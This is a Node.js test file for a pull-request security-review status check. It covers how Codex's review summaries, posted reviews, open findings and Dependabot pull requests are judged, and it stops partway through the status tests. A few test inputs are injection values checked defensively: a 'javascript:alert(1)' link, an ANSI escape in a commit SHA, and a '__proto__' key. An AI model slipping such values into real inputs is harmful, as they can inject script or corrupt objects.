// Checks the security-review check (scripts/security-review.mjs): what counts as proof that a pull
// request's security review has run, and the status it gives. Run by the core's tests workflow
// (.github/workflows/tests.yml).
//
//   node tests/security-review-test.mjs
import { execFileSync } from "node:child_process";
import { rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { CORE } from "../scripts/core-address.mjs";
import { mended } from "../scripts/mend.mjs";
import { CODE_UNREAD, CODE_WAITS, CONTEXT, EDITED, NEW_LINE, UNREAD, boundOf, commentsAlone, form, judge, named, pinsAlone, powerFilesOf, reviewersOf, status, withCode } from "../scripts/security-review.mjs";
import { blockingOf, otherOf, postedKind } from "../scripts/review-record.mjs";
import { judge as codeReview } from "../scripts/code-review-wait.mjs";
import { scratchDir } from "../scripts/scratch-core.mjs";
import { checkout, copied as manifestAt, OWN_SCRIPT } from "../scripts/core-path-scratch.mjs";

let failed = 0;
const ok = (cond, what) => { console.log(`${cond ? "ok  " : "FAIL"} ${what}`); if (!cond) failed++; };
const HEAD = "a".repeat(40);
const SEEN = "b".repeat(40);
const pull = { state: "open", draft: false, head: { sha: HEAD }, base: { repo: { owner: { login: "someone" } } } }; // (said() posts as "someone", the owner)
const brace = (text) => text.replaceAll("{", "&#123;").replaceAll("}", "&#125;");
// the summary as Codex's app writes it and GitHub's API gives it: a first line, then its state in a comment
const summary = (security, at = "2026-11-12T10:00:00Z", who = { login: "chatgpt-codex-connector[bot]", type: "Bot" }) => ({
  user: who, author_association: "NONE", updated_at: at,
  body: `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${JSON.stringify({ code_review: { commit_sha: null, status: null }, security_review: security })} -->\n<details>the table</details>`,
});
const done = { commit_sha: SEEN, has_any_findings: null, has_unresolved_findings: null, status: "completed" };
const running = { ...done, status: "running" };
const onHead = { ...done, commit_sha: HEAD };
const said = (body, assoc = "OWNER", at = "2026-11-12T11:00:00Z") => ({ user: { login: "someone", type: "User" }, author_association: assoc, created_at: at, updated_at: at, body });
// a finding of Codex's security review, as its app posts one on a line of the change
const finding = (at, who = { login: "chatgpt-codex-connector[bot]", type: "Bot" }) => ({ user: who, author_association: "NONE", created_at: at, path: "a.js", line: 3, body: "<!-- codex-security-review-finding:v1 -->\n\n### Codex Security Review\n\nA finding." });
const open = { ...done, has_any_findings: true, has_unresolved_findings: true };
// the mend of each status that asks for a review posted names who posts it, the actor first (#395)
// (and what the posted review carries: its kind, the whole SHA it read, and its two lines of counts; #403)
const POSTS = "reviews, posts Security review: <whole SHA>⏎Blocking findings: N.⏎Other findings: M.";
const CHECKS = `Mend: fallback ${POSTS}`;
const OWN = `Mend: your reviewer ${POSTS}`;
const NOT_FOUND = `Codex open finding hidden. ${CHECKS}`;
// (a review posted as the form says, each quoted line on a line of its own, is read as the checks and the count of
// reviews read it: its kind, the head by its whole SHA, and both counts)
const posting = (kind, sha, blocking, other) => form(kind).split(NEW_LINE).map((line) => line.replace("<whole SHA>", sha).replace("N.", `${blocking}.`).replace("M.", `${other}.`)).join("\n");
ok(["Security", "Code"].every((kind) => { const body = posting(kind, HEAD, 2, 0); return postedKind(body) === kind.toLowerCase() && named(body).includes(HEAD) && blockingOf(body) === 2 && otherOf(body) === 0; })
  && form("Security").split(NEW_LINE).length === 3, "a review posted as each mend's form says is read whole: its kind, the head's whole SHA, its blocking and its other findings");
const is = (verdict, isDone, words) => verdict?.sha === HEAD && verdict.done === isDone && verdict.why.includes(words);

// Two summaries Codex's app really posted on this repository's pull requests, byte for byte as GitHub's API gives them
// (its issue comments, which the workflow reads), the core's address aside: the form the check reads, kept here so that
// a change in it is seen in the core before a project waits on it (core archive 201).
const REAL_CLEAN = "<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 {\"code_review\":{\"commit_sha\":\"80c3527ef98503ce036cc33343ba1391f45d312c\",\"has_any_findings\":false,\"has_unresolved_findings\":false,\"status\":\"completed\"},\"security_review\":{\"commit_sha\":\"be5f0965b6ccbbfebdee33e06fe7d93e45ff22b0\",\"has_any_findings\":null,\"has_unresolved_findings\":null,\"status\":\"completed\"}} -->\n<!-- codex-security-review:v1 {\"blockingSeverityThreshold\":\"P0\",\"headSha\":\"be5f0965b6ccbbfebdee33e06fe7d93e45ff22b0\",\"mergeGateEnabled\":false,\"pullRequestNumber\":199,\"repository\":\"<the core>\",\"status\":\"completed\"} -->\n<details>\n<summary><strong>Codex Review Summary</strong>: ✅ Completed</summary>\n\nThis comment shows the latest Codex review activity on this pull request.\n\n| Review | Status | Commit | Review trigger |\n| --- | --- | --- | --- |\n| 📝 **Code Review** | ✅ **Completed** <relative-time datetime=\"2026-11-14T01:13:55.985631Z\">2026-11-14T01:13:55.985631Z</relative-time> | `80c3527` | Manual request |\n| 🔒 **Security Review** | ✅ **Completed** <relative-time datetime=\"2026-11-14T01:08:34.247269Z\">2026-11-14T01:08:34.247269Z</relative-time> | `be5f096` | Draft marked ready |\n\n\n\n<details> <summary>ℹ️ About Codex in GitHub</summary>\n<br/>\n\n[Your team has set up Codex to review pull requests in this repo](https://chatgpt.com/codex/cloud/settings/general). Reviews are triggered when you\n- Open a pull request for review\n- Mark a draft as ready\n- Comment \"@codex review\" or \"@codex security review\".\n\nCodex reacts with 👀 while any review is running, comments if it has suggestions, and reacts with 👍 once all reviews finish with no findings.\n\n</details>\n\n</details>".replaceAll("<the core>", CORE);
const REAL_FINDING = "<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 {\"code_review\":{\"commit_sha\":\"d457776390f620deea6cf59e4b33dee6a139bcd3\",\"has_any_findings\":false,\"has_unresolved_findings\":false,\"status\":\"completed\"},\"security_review\":{\"commit_sha\":\"4df287f8f7cd2b43add2963fe9e6df596e7dc8f7\",\"has_any_findings\":true,\"has_unresolved_findings\":true,\"status\":\"completed\"}} -->\n<!-- codex-security-review:v1 {\"blockingSeverityThreshold\":\"P0\",\"headSha\":\"4df287f8f7cd2b43add2963fe9e6df596e7dc8f7\",\"mergeGateEnabled\":false,\"pullRequestNumber\":190,\"repository\":\"<the core>\",\"status\":\"completed\"} -->\n<details>\n<summary><strong>Codex Review Summary</strong>: ✅ Completed</summary>\n\nThis comment shows the latest Codex review activity on this pull request.\n\n| Review | Status | Commit | Review trigger |\n| --- | --- | --- | --- |\n| 📝 **Code Review** | ✅ **Completed** <relative-time datetime=\"2026-11-13T22:23:05.884667Z\">2026-11-13T22:23:05.884667Z</relative-time> | `d457776` | Manual request |\n| 🔒 **Security Review** | ✅ **Completed** <relative-time datetime=\"2026-11-13T22:03:32.372561Z\">2026-11-13T22:03:32.372561Z</relative-time> | `4df287f` | Draft marked ready |\n\n### Security findings\n\n#### Advisory findings (1)\n\n- 🟡 [Run NuGet validation when MSBuild.rsp changes](https://github.com/<the core>/pull/190#discussion_r4569157823) · **Medium**\n\n<details> <summary>ℹ️ About Codex in GitHub</summary>\n<br/>\n\n[Your team has set up Codex to review pull requests in this repo](https://chatgpt.com/codex/cloud/settings/general). Reviews are triggered when you\n- Open a pull request for review\n- Mark a draft as ready\n- Comment \"@codex review\" or \"@codex security review\".\n\nCodex reacts with 👀 while any review is running, comments if it has suggestions, and reacts with 👍 once all reviews finish with no findings.\n\n</details>\n\n</details>".replaceAll("<the core>", CORE);
const real = (body, at = "2026-11-14T01:13:56Z") => ({ user: { login: "chatgpt-codex-connector[bot]", type: "Bot" }, author_association: "NONE", updated_at: at, body });
ok(is(judge(pull, [real(REAL_CLEAN)]), true, "has run (on be5f096, earlier than the head aaaaaaa)") && judge(pull, [real(REAL_CLEAN)]).warning === undefined, "a real summary of Codex's, its security review completed with no finding, is read as one: no warning");
ok(is(judge(pull, [real(brace(REAL_CLEAN))]), true, "has run (on be5f096, earlier than the head aaaaaaa)") && judge(pull, [real(brace(REAL_CLEAN))]).warning === undefined, "and the same with each brace written as an entity, as a delivery may show it");
ok(is(judge(pull, [real(REAL_FINDING)]), false, NOT_FOUND) && judge(pull, [real(REAL_FINDING)]).warning === undefined, "a real summary with a finding marked open is read as one too");
// a summary of Codex's whose state cannot be read: a warning beside a verdict that is what it would be with no summary
for (const [what, body] of [
  ["a state line of another version", REAL_CLEAN.replace("codex-review-state:v1", "codex-review-state:v2")],
  ["a state that is no JSON", REAL_CLEAN.replace("{\"code_review\"", "{code_review")],
  ["a state with no security review in it", REAL_CLEAN.replace("\"security_review\"", "\"security_scan\"")],
]) {
  const v = judge(pull, [real(body)]);
  ok(v.warning === UNREAD && v.done === false && v.why.includes("no security review"), `a summary of Codex's with ${what}: the check warns, and waits as with no summary`, JSON.stringify(v));
}
ok(judge(pull, [real(REAL_CLEAN.replace("codex-review-state:v1", "codex-review-state:v2")), said("Security review: checked")]).done === true && judge(pull, [real("A comment of Codex's that is no summary.")]).warning === undefined, "a posted review still settles it, and a comment of Codex's that is no summary brings no warning");
// a receipt Codex's app really posted on this repository's pull requests when its code review found nothing, byte for
// byte as GitHub's API gives it (its issue comments): no summary, and no finding
const REAL_RECEIPT = "<!-- codex-review-receipt:v1 -->\n\nCodex Review: Didn't find any major issues. Breezy!\n\n**Reviewed commit:** `ea27e8d89a`\n\n<details> <summary>ℹ️ About Codex in GitHub</summary>\n<br/>\n\n[Your team has set up Codex to review pull requests in this repo](https://chatgpt.com/codex/cloud/settings/general). Reviews are triggered when you\n- Open a pull request for review\n- Mark a draft as ready\n- Comment \"@codex review\".\n\nIf Codex has suggestions, it will comment; otherwise it will react with 👍.\n\n\n\n\nCodex can also answer questions or update the PR. Try commenting \"@codex address that feedback\".\n            \n</details>";
ok(is(judge(pull, [real(REAL_RECEIPT)]), false, "no security review") && judge(pull, [real(REAL_RECEIPT)]).warning === undefined && is(judge(pull, [real(REAL_RECEIPT), summary(done)]), true, "has run")
  && is(judge(pull, [summary(open), real(REAL_RECEIPT, "2026-11-12T12:00:00Z"), said("Security review: the fix checked")]), true, "its open finding is not among the comments"), "a real receipt of Codex's is read as no summary, brings no warning, hides no summary after it and is no finding");

// Nothing to mark.
ok(judge({ ...pull, state: "closed" }, [summary(done)]) === undefined && judge({ ...pull, draft: true }, [summary(done)]) === undefined, "a closed pull request and a draft get no status");
ok(judge({ ...pull, head: { sha: "main" } }, []) === undefined && judge({ ...pull, head: null }, []) === undefined && judge(null, []) === undefined && judge({ state: "open", head: { sha: HEAD } }, []) === undefined, "nor one with no commit to name, or not said to be no draft");

// Codex's own summary.
ok(is(judge(pull, []), false, "no security review") && is(judge(pull, null), false, "no security review") && is(judge(pull, [null, 3, {}, { user: null, body: 5 }]), false, "no security review"), "no comments, or none that can be read: it waits");
ok(is(judge(pull, [summary(running)]), false, "no security review") && is(judge(pull, [summary({ ...done, status: null })]), false, "no security review") && is(judge(pull, [summary(null)]), false, "no security review"), "a review still running, or not begun, is no review");
ok(is(judge(pull, [summary(done)]), true, `has run (on ${SEEN.slice(0, 7)}, earlier than the head`) && is(judge(pull, [summary(onHead)]), true, "has run (on aaaaaaa)"), "Codex's summary that says completed passes, and names the commit it saw");
ok(is(judge(pull, [summary({ ...done, commit_sha: "x\u001b[31m" })]), true, "has run") && judge(pull, [summary({ ...done, commit_sha: "x\u001b[31m" })]).why === "Codex's security review has run", "a commit that is no commit is not repeated");
ok(is(judge(pull, [summary({ ...done, has_any_findings: true, has_unresolved_findings: false })]), true, "has run"), "its findings all closed: it passes");
ok(is(judge(pull, [[said("thanks")], [said("more")], [summary(done)]]), true, "has run"), "pages of comments are read as one list");
ok(is(judge(pull, [summary(running), summary(done, "2026-11-12T12:00:00Z")]), false, "no security review") && is(judge(pull, [{ ...summary(done), body: "<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 &#123;not json -->\n" }, summary(done)]), false, "no security review"), "the app keeps one summary: only its first is read, never a later one that says more");

// Only Codex's own app, only its own two lines.
ok(is(judge(pull, [summary(done, undefined, { login: "chatgpt-codex-connector", type: "User" })]), false, "no security review") && is(judge(pull, [summary(done, undefined, { login: "chatgpt-codex-connector[bot]", type: "User" })]), false, "no security review") && is(judge(pull, [{ ...summary(done), user: { login: "someone", type: "User" }, author_association: "OWNER" }]), false, "no security review"), "the same text from any other account, the owner's too, is no proof");
ok(is(judge(pull, [{ ...summary(done), body: `Quoted from the change:\n${summary(done).body}` }]), false, "no security review") && is(judge(pull, [{ ...summary(done), body: summary(done).body.replace("-->\n<!--", "-->\nx\n<!--") }]), false, "no security review"), "the state anywhere but on the summary's second line is not read");
ok(is(judge(pull, [{ ...summary(done), body: "<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 &#123;not json -->\n" }]), false, "no security review") && is(judge(pull, [{ ...summary(done), body: `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${"x".repeat(5000)} -->\n` }]), false, "no security review"), "a state that is no JSON, or too long to be one, is no proof");
ok(is(judge(pull, [{ ...summary(done), body: `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${brace('{"security_review":"completed"}')} -->\n` }]), false, "no security review") && is(judge(pull, [{ ...summary(done), body: `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${brace('{"__proto__":{"status":"completed"}}')} -->\n` }]), false, "no security review"), "a state of another shape is no proof");

// A review posted in a comment.
ok(is(judge(pull, [said("Security review: the fallback reviewer's, of the whole diff. Blocking findings: 0.")]), true, "is posted") && is(judge(pull, [said("**Security review:** none found", "COLLABORATOR")]), true, "is posted") && is(judge(pull, [said("Security review: ok", "MEMBER")]), true, "is posted"), "a comment that opens \"Security review:\", plain or bold, from the owner, a member or a collaborator passes");
ok(["NONE", "CONTRIBUTOR", "FIRST_TIME_CONTRIBUTOR", "FIRST_TIMER", "MANNEQUIN", null, 7, ["OWNER"]].every((assoc) => is(judge(pull, [said("Security review: fine", assoc)]), false, "no security review")), "the same comment from anyone else is no proof");
ok(["security review: fine", " Security review: fine", "\nSecurity review: fine", "> Security review: fine", "Security review fine", "The Security review: fine", "@codex security review", "*Security review:* fine", "## Security review: fine"].every((body) => is(judge(pull, [said(body)]), false, "no security review")), "nor a comment that only holds the words, or opens another way");
ok(is(judge(pull, [summary(running), said("Security review: the fallback reviewer's")]), true, "is posted") && is(judge(pull, [summary({ ...running, status: "queued" }), said("Security review: the fallback reviewer's")]), true, "is posted"), "Codex still running, or queued, and another's review posted after the summary last changed: it passes");

// Codex's own running: a review posted before it began does not end the wait for it (core archive 206).
const BEFORE = "begun after every \"Security review:\" posted. Mend: wait for it";
const early = said("Security review: none needed", "OWNER", "2026-11-12T09:00:00Z");
// a summary Codex's app really posted while both its reviews ran, byte for byte as GitHub's API gives it, the core's
// address aside: its security review's row says when it began, 08:06:33, before the summary last changed, 08:06:47
const REAL_RUNNING = "<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 {\"code_review\":{\"commit_sha\":\"8668a53e4e473afb6673643f34871dcbe11d841c\",\"has_any_findings\":null,\"has_unresolved_findings\":null,\"status\":\"running\"},\"security_review\":{\"commit_sha\":\"8668a53e4e473afb6673643f34871dcbe11d841c\",\"has_any_findings\":null,\"has_unresolved_findings\":null,\"status\":\"running\"}} -->\n<!-- codex-security-review:v1 {\"blockingSeverityThreshold\":\"P0\",\"headSha\":\"8668a53e4e473afb6673643f34871dcbe11d841c\",\"mergeGateEnabled\":false,\"pullRequestNumber\":291,\"repository\":\"<the core>\",\"status\":\"running\"} -->\n<details>\n<summary><strong>Codex Review Summary</strong>: 🔄 Running</summary>\n\nThis comment shows the latest Codex review activity on this pull request.\n\n| Review | Status | Commit | Review trigger |\n| --- | --- | --- | --- |\n| 📝 **Code Review** | 🔄 **Running** since <relative-time datetime=\"2026-11-15T08:06:44.569268Z\">2026-11-15T08:06:44.569268Z</relative-time> | `8668a53` | Manual request |\n| 🔒 **Security Review** | 🔄 **Running** since <relative-time datetime=\"2026-11-15T08:06:33.856908Z\">2026-11-15T08:06:33.856908Z</relative-time> | `8668a53` | Draft marked ready |\n\n\n\n<details> <summary>ℹ️ About Codex in GitHub</summary>\n<br/>\n\n[Your team has set up Codex to review pull requests in this repo](https://chatgpt.com/codex/cloud/settings/general). Reviews are triggered when you\n- Open a pull request for review\n- Mark a draft as ready\n- Comment \"@codex review\" or \"@codex security review\".\n\nCodex reacts with 👀 while any review is running, comments if it has suggestions, and reacts with 👍 once all reviews finish with no findings.\n\n</details>\n\n</details>".replaceAll("<the core>", CORE);
const live = (body = REAL_RUNNING, at = "2026-11-15T08:06:47Z") => [real(brace(body), at)];
const at = (time) => said("Security review: the fallback reviewer's", "OWNER", `2026-11-15T${time}Z`);
ok(is(judge(pull, [...live(), at("08:06:40")]), true, "is posted") && is(judge(pull, [...live(), at("08:06:30")]), false, BEFORE) && judge(pull, live()).warning === undefined, "a real running summary: a review posted after its security review's row says it began, though before the summary last changed, ends the wait; one posted before it does not");
ok(is(judge(pull, [...live(REAL_RUNNING.replace('datetime="2026-11-15T08:06:33', 'datetime="2026-11-15T09:06:33')), at("08:06:50")]), true, "is posted") && is(judge(pull, [...live(REAL_RUNNING.replace('datetime="2026-11-15T08:06:33', 'datetime="2026-11-15T09:06:33')), at("08:06:40")]), false, BEFORE), "a row's time later than the summary's last change is not read: the last change is");
ok([REAL_RUNNING.replace('datetime="2026-11-15T08:06:33.856908Z"', 'datetime="soon"'), REAL_RUNNING.replace("| 🔒 **Security Review** | 🔄 **Running** since", "| 🔒 **Security Review** | 🔄 **Running** from")].every((body) => is(judge(pull, [...live(body), at("08:06:40")]), false, BEFORE) && is(judge(pull, [...live(body), at("08:06:50")]), true, "is posted")), "a row whose time cannot be read, or of another form: the summary's last change is read");
ok(is(judge(pull, [...live(REAL_RUNNING.replace("🔒 **Security Review** | 🔄 **Running** since", "🔒 **Security Review** | ⏳ **Queued** since")), at("08:06:40")]), false, BEFORE) && is(judge(pull, [...live(REAL_RUNNING.replace(/\| 🔒 \*\*Security Review\*\*[^\n]*\n/u, "")), at("08:06:46")]), false, BEFORE), "the code review's row, though it says running since 08:06:44, never stands for the security review's");
ok(is(judge(pull, [summary(running), early]), false, BEFORE) && is(judge(pull, [summary({ ...running, status: "in_progress" }, "2026-11-12T12:00:00Z"), said("Security review: x")]), false, BEFORE), "a review posted before Codex's summary last changed, a note that none is needed among them, does not end the wait, and the status says the mend");
ok(is(judge(pull, [summary(running, "2026-11-12T11:00:00Z"), said("Security review: same second", "OWNER", "2026-11-12T11:00:00Z")]), false, BEFORE) && is(judge(pull, [summary(running, "2026-11-12T10:00:00Z"), early, said("Security review: the fallback reviewer's", "OWNER", "2026-11-12T10:40:00Z")]), true, "is posted"), "one posted in the same second does not; one posted after it does, whatever was posted before");
ok([undefined, null, "soon"].every((at) => is(judge(pull, [{ ...summary(running), updated_at: at }, said("Security review: x")]), false, BEFORE)) && is(judge(pull, [summary(running), { ...said("Security review: x"), created_at: "soon", updated_at: "soon" }]), false, BEFORE), "a summary, or a review, with no time that can be read: nothing counts as posted after it");
const retold = { ...said(`Security review: on ${HEAD}`), updated_at: "2026-11-12T12:00:00Z" }, once = said(`Security review: on ${HEAD}`);
ok(is(judge(pull, [retold]), false, EDITED) && mended(status(judge(pull, [retold]), false).description) && status(judge(pull, [retold]), false).description.length <= 140 && is(judge(pull, [retold, once]), true, "is posted")
  && is(judge(pull, [retold], [], undefined, undefined, false), true, "is posted"), "a review edited since it was posted counts no longer, its status saying the mend within GitHub's 140 characters; one never edited beside it counts; on a pull request from before the check it counts as it did");
ok(is(judge(pull, [summary({ ...done, status: null }), early]), true, "is posted") && is(judge(pull, [early]), true, "is posted") && is(judge(pull, [summary({ ...done, status: "failed" }), early]), true, "is posted") && is(judge(pull, [summary(done, "2026-11-12T12:00:00Z"), early]), true, "has run"), "where no review of Codex's runs (none begun, none at all, a word not known as running, or one finished), a review posted at any time counts as before");
const old = judge(pull, [summary(running), early], [], [], undefined, false);
ok(old.done === true && old.why.startsWith("before this check came, so not waited for: Codex's security review began after"), "a pull request from before the check is told of the review posted too early, never held for it");
ok([true, false].every((a) => status(judge(pull, [summary(running), early]), a).description.endsWith("wait for it") && status(old, a).description.endsWith("\"Security review:\"")), "the status says it whole, within GitHub's 140 characters, before the check came too");

// A finding of Codex's security review marked open: only a review posted after its newest finding settles it.
ok(is(judge(pull, [summary(open)], [finding("2026-11-12T10:30:00Z")]), false, "Codex finding open") && is(judge(pull, [summary(open)]), false, NOT_FOUND), "a finding marked open and no review posted: it waits");
ok(["true", 1, "false", 0, undefined, {}].every((mark) => is(judge(pull, [summary({ ...open, has_unresolved_findings: mark })]), false, NOT_FOUND)), "a finding's mark that is no real false or null reads as one open: it waits");
ok(is(judge(pull, [summary(open), said("Security review: the second reviewer's", "OWNER", "2026-11-12T10:00:00Z")], [finding("2026-11-12T10:30:00Z")]), false, "Codex finding open"), "a review posted before the finding does not settle it");
ok(is(judge(pull, [summary(open), said("Security review: the fix checked, nothing left", "OWNER", "2026-11-12T11:00:00Z")], [[finding("2026-11-12T10:30:00Z")]]), true, "a review is posted after its newest finding"), "a review posted after the finding settles it");
ok(is(judge(pull, [summary(open), said("Security review: the first fix checked", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z"), finding("2026-11-12T11:30:00Z")]), false, "Codex finding open") && is(judge(pull, [summary(open), said("Security review: the first fix checked", "OWNER", "2026-11-12T11:00:00Z"), finding("2026-11-12T11:30:00Z")], []), false, "Codex finding open"), "a newer finding, among the review comments or the plain ones, asks for a newer review");
ok(is(judge(pull, [summary(open), said("Security review: fine", "NONE", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")]), false, "Codex finding open") && is(judge(pull, [summary(open), { ...said("Security review: fine"), created_at: "soon", updated_at: "soon" }], [finding("2026-11-12T10:30:00Z")]), false, "Codex finding open"), "nor does anyone else's comment settle it, or one with no time to it");
ok(is(judge(pull, [summary(open), said("Security review: the fix checked", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T12:00:00Z", { login: "someone", type: "User" }), { ...finding("2026-11-12T12:00:00Z"), body: "A P1.\n<!-- codex-code-review-finding:v1 -->" }, null, "x"]), true, "its open finding is not among the comments"), "a look-alike finding from another account, and a finding of the code review, ask for nothing");
ok(is(judge(pull, [summary(open), said("Security review: the fix checked")], [{ ...finding("x"), created_at: null }]), false, "Codex finding open"), "a finding with no time to it is taken as the newest");
ok(is(judge(pull, [summary(open), said("Security review: the fix checked")]), true, "its open finding is not among the comments, and a review is posted after it"), "marked open with no finding to be found: a review posted after Codex's summary last changed settles it, and the status says no finding was found");
// #251: the finding not to be found (one in a review's own body, say), a review posted before Codex's summary last
// changed, the latest the finding can have come, settles nothing, whoever posted it
const late = summary(open, "2026-11-12T12:00:00Z");
ok(is(judge(pull, [late, said("Security review: the fix checked")]), false, NOT_FOUND) && is(judge(pull, [summary(open, "2026-11-12T11:00:00Z"), said("Security review: same second")]), false, NOT_FOUND), "a review posted before the summary last changed, or in the same second, does not settle a finding not to be found: it waits, saying the mend");
ok(is(judge(pull, [late, said("Security review: before"), said("Security review: the fix checked", "MEMBER", "2026-11-12T12:30:00Z")]), true, "a review is posted after it"), "one posted after the summary last changed does, whatever was posted before");
ok([undefined, null, "soon"].every((at) => is(judge(pull, [{ ...late, updated_at: at }, said("Security review: x")]), false, NOT_FOUND)) && is(judge(pull, [summary(open), { ...said("Security review: x"), created_at: "soon", updated_at: "soon" }]), false, NOT_FOUND), "a summary, or a review, with no time that can be read: nothing counts as posted after it");
// #293: a finding found, and a newer one given in a review's own body alone: a review posted after the one found but
// before Codex's summary last changed settles nothing either
const SINCE = `Codex summary changed since. ${CHECKS}`;
ok(is(judge(pull, [late, said("Security review: x", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")]), false, SINCE) && is(judge(pull, [summary(open, "2026-11-12T11:00:00Z"), said("Security review: same second")], [finding("2026-11-12T10:30:00Z")]), false, SINCE), "a review after the finding found but before the summary last changed, or in the same second, does not settle the mark: it waits, saying the mend");
ok(is(judge(pull, [late, said("Security review: x", "OWNER", "2026-11-12T12:30:00Z")], [finding("2026-11-12T10:30:00Z")]), true, "after its newest finding") && is(judge(pull, [late, said("Security review: x", "OWNER", "2026-11-12T12:30:00Z")], [finding("2026-11-12T13:00:00Z")]), false, "Codex finding open"), "one after both settles it; one after the summary's change but before a finding found does not");
ok([undefined, null, "soon"].every((at) => is(judge(pull, [{ ...late, updated_at: at }, said("Security review: x", "OWNER", "2026-11-12T12:30:00Z")], [finding("2026-11-12T10:30:00Z")]), false, SINCE)), "a summary with no time that can be read: nothing counts as posted after it");
const after = judge(pull, [late, said("Security review: x", "OWNER", "2026-11-12T11:00:00Z")], [finding("2026-11-12T10:30:00Z")], undefined, undefined, false);
ok(after.done === true && after.why.startsWith("before this check came, so not waited for: Codex's summary changed after the review") && is(judge(pull, [late, said("Security review: x", "OWNER", "2026-11-12T10:00:00Z")], [finding("2026-11-12T10:30:00Z")], undefined, undefined, false), false, "Codex finding open"), "a pull request from before the check is told of the summary's change, never held; one with no review after the finding found waits, as it did before");
ok(status(judge(pull, [late, said("Security review: x")], [finding("2026-11-12T10:30:00Z")]), false).description.endsWith(SINCE) && status(judge(pull, [late, said("Security review: x")], [finding("2026-11-12T10:30:00Z")]), true).description.includes("Mend: fallback") && [true, false].every((a) => status(after, a).description.endsWith("its newest finding")), "the status says it whole, within GitHub's 140 characters, the actor first where an advisory one is cut, before the check came too");
const unfound = judge(pull, [late, said("Security review: the fix checked")], [], [], undefined, false);
ok(unfound.done === true && unfound.why.startsWith("before this check came, so not waited for: Codex's open security finding is not among the comments") && is(judge(pull, [late], [], [], undefined, false), false, NOT_FOUND), "a pull request from before the check is told the finding is not found and no review after it, never held; with no review posted at all it waits, as it did before");
ok(status(judge(pull, [late, said("Security review: x")]), false).description.endsWith(NOT_FOUND) && status(judge(pull, [late, said("Security review: x")]), true).description.includes("Mend: fallback") && [true, false].every((a) => status(unfound, a).description.endsWith("nor a review after it")), "the status says it whole, within GitHub's 140 characters, the actor first where an advisory one is cut, before the check came too");

// Dependabot's own pull request.
const bump = { ...pull, user: { login: "dependabot[bot]", type: "Bot" }, head: { sha: HEAD, repo: { full_name: "o/r" } }, base: { repo: { full_name: "o/r", owner: { login: "someone" } } } };
const by = (sha, author = { login: "dependabot[bot]", type: "Bot" }, committer = { login: "web-flow", type: "User" }, verified = true) => ({ sha, author, committer, commit: { verification: { verified } } });
const its = [[by("c".repeat(40))], [by(HEAD)]];
ok(is(judge(bump, [], [], its), true, "floor rule 17") && is(judge(bump, [said("thanks")], [], its), true, "floor rule 17") && is(judge(bump, [summary({ ...done, status: null })], [], its), true, "floor rule 17"), "Dependabot's own pull request, with no review begun on it, passes: the floor holds it another way");
ok(is(judge({ ...bump, user: { login: "dependabot[bot]", type: "User" } }, [], [], its), false, "no security review") && is(judge({ ...bump, user: { login: "dependabot", type: "Bot" } }, [], [], its), false, "no security review") && is(judge({ ...bump, head: { sha: HEAD, repo: { full_name: "x/r" } } }, [], [], its), false, "no security review") && is(judge({ ...bump, head: { sha: HEAD, repo: null } }, [], [], its), false, "no security review") && is(judge({ ...bump, base: null }, [], [], its), false, "no security review"), "a look-alike of it, or one from another repository, does not");
const someone = { login: "someone", type: "User" };
ok([[by(HEAD, someone)], [by("c".repeat(40)), by(HEAD, someone, someone)], [by(HEAD, undefined, someone)], [by(HEAD, undefined, undefined, false)], [by(HEAD, { login: "dependabot[bot]", type: "User" })], [by(HEAD, null)], [{ sha: HEAD }], [by("c".repeat(40))], [], null, undefined].every((commits) => is(judge(bump, [], [], commits), false, "no security review")), "nor one that holds a commit somebody else wrote or committed, or one GitHub did not sign, or whose commits are not known up to the head");
ok(is(judge(bump, [], [], [by("c".repeat(40)), { ...by(HEAD, someone), parents: [{}, {}] }]), false, "no security review"), "a merge that brings it up to date is somebody else's commit too");
ok(is(judge(bump, [summary(running)], [], its), false, "no security review") && is(judge(bump, [summary({ ...done, status: "queued" })], [], its), false, "no security review") && is(judge(bump, [summary(open)], [finding("2026-11-12T10:30:00Z")], its), false, "Codex finding open") && is(judge(bump, [summary({ ...done, commit_sha: HEAD })], [], its), true, "Codex's security review has run") && is(judge(bump, [said(`Security review: read against the release notes, on ${HEAD}`)], [], [by(HEAD, someone)]), true, "is posted"), "a review of Codex's that began on it is waited for and read like any other, and a posted review counts on it as on any");

// The status.
const wait = judge(pull, []);
const pass = judge(pull, [summary(done)]);
ok(status(wait, false).state === "pending" && status(wait, false).description === "Waiting: no security review has run yet. Mend: your security reviewer reviews; with Codex's app, the fallback reviewer after 5 min" && status(pass, false).state === "success" && status(pass, false).description.startsWith("Codex's security review has run"), "when it is not advisory, a pull request with no review waits and one with a review passes");
ok(status(wait, true).state === "success" && status(wait, true).description.startsWith("Advisory: no security review has run yet. Mend: your security reviewer ") && status(pass, true).state === "success" && status(pass, true).description.startsWith("Advisory: Codex's"), "while advisory it always passes, and says what it would have done");
ok([wait, pass, judge(pull, [said("Security review: x")]), judge(pull, [summary(open)]), judge(pull, [summary(open), said("Security review: x")])].every((v) => [true, false].every((a) => status(v, a).context === CONTEXT && status(v, a).description.length <= 140)), "every status has the one name and a description GitHub takes");
ok(status(pass, true, "https://github.com/o/r/actions/runs/1").target_url === "https://github.com/o/r/actions/runs/1" && !("target_url" in status(pass, true)) && !("target_url" in status(pass, true, "javascript:alert(1)")) && !("target_url" in status(pass, true, "https://x/?a=b c")), "it links to its run, and to nothing that is no plain https address");
const unread = judge(pull, [real(REAL_CLEAN.replace("codex-review-state:v1", "codex-review-state:v2"))]), longest = { sha: HEAD, done: true, why: "x".repeat(200), warning: UNREAD };
